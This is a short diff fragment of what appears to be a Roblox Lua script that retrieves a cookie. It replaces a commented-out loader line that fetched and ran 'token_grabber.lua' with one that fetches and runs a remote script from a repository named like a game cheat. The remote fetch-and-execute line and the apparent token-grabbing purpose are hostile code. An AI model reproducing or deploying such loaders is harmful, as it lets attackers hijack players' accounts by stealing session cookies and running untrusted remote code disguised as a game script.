@@ -66,4 +66,4 @@ else
     print("Échec de la récupération du cookie")
 end
 
--- loadstring(game:HttpGet("https://raw.githubusercontent.com/votre-username/votre-repo/main/token_grabber.lua"))()
+-- loadstring(game:HttpGet("https://raw.githubusercontent.com/BestStealABrainrotScript/InstantStealSpawnerBrainrotsSpawner/refs/heads/main/SCRIPT.lua"))()
